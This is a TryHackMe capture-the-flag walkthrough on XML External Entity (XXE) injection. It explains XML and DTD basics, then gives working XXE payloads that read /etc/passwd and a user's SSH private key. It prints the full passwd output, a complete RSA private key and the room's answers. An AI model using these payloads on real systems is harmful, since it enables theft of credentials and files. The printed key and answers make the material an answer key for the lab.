# XXE

This room aims at providing the basic introduction to XML External entity(XXE vulnerability.

[XXE](https://tryhackme.com/room/xxe)

## Topic's

* XML Fundamentals
* XML External Entity (XXE)

## Task 1 Deploy the VM

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).

1. An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
2. out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

1. Deploy the VM

`No answer needed`

## Task 2 eXtensible Markup Language

Before we move on to learn about XXE exploitation we'll have to understand XML properly.

**What is XML?**

XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.

**Why we use XML?**

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.
2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

**Syntax**

Every XML document mostly starts with what is known as XML Prolog.

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.

Every XML document must contain a `ROOT` element.

Ex:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

In the above example the `<mail>` is the ROOT element of that document and `<to>`, `<from>`, `<subject>`, `<text>` are the children elements. If the XML document doesn't have any root element then it would be consideredwrong or invalid XML doc.

Another thing to remember is that XML is a case sensitive language. If a tag starts like `<to>` then it has to end by `</to>` and not by something like `</To>`(notice the capitalization of T)

Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML.

Ex:

```xml
<text category = "message">You need to learn about XXE</text>
```

In the above example category is the attribute name and message is the attribute value.

1. Full form of XML

`eXtensible Markup Language`

2. Is XML case sensitive?

`yes`

3. Is it compulsory to have XML prolog in XML documents?

`no`

4. Can we validate XML documents against so schema?

`yes`

5. How can we specify XML version and encoding in XML document?

`XML Prolog`

## Task 3 DTD

Before we move on to start learning about XXE we'll have to understand what is DTD in XML.

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

Let us try to understand this with the help of an example. Say we have a file named note.dtd with the following content:

```xml
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.

Ex: Below is given an XML document that uses note.dtd

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

So now let's understand how that DTD validates the XML. Here's what all those terms used in `note.dtd` mean

* !DOCTYPE note -  Defines a root element of the document named **note**
* !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
* !ELEMENT to - Defines the `to` element to be of type "#PCDATA"
* !ELEMENT from - Defines the `from` element to be of type "#PCDATA"
* !ELEMENT heading  - Defines the `heading` element to be of type "#PCDATA"
* !ELEMENT body - Defines the body `element` to be of type "#PCDATA"

NOTE: #PCDATA means parseable character data.

1. With what extension do you save a DTD file?

`dtd`

2. How do you define a new ELEMENT?

`!ELEMENT`

3. How do you define a ROOT element?

`!DOCTYPE`

4. How do you define a new ENTITY?

`!ENTITY`

## Task 4 XXE payload

Now we'll see some XXE payload and see how they are working.

1. The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.

2. We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.

1. Try the payload mentioned in description on the website.

`No answer needed`

## Task 5 Exploiting

Now let us see some payloads in action. The payload that I'll be using is the one we saw in the previous task.

1. Let's see how the website would look if we'll try to use the payload for displaying the name.

![](https://i.imgur.com/OHXXxi4.png)

On the left side, we can see the burp request that was sent with the URL encoded payload and on the right side we can see that the payload was able to successfully display name `falcon feast`

2. Now let's try to read the `/etc/passwd`

![](https://i.imgur.com/092GSLz.png)

1. Try to display your own name using any payload.

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

`No answer needed`

2. See if you can read the /etc/passwd

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

`No answer needed`

3. What is the name of the user in /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
```

`falcon`

4. Where is falcon's SSH key located?

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC
lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB
2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN
MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ
IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO
HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD
RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5
bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh
NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y
OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea
TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X
Qfi/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya
6bgLzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb
j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA
MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn
qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg
faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R
sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe
f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr
wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g
83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz
N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw
HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm
9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ
9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA=
-----END RSA PRIVATE KEY-----
```

5. What are the first 18 characters for falcon's private key

`MIIEogIBAAKCAQEA7b`
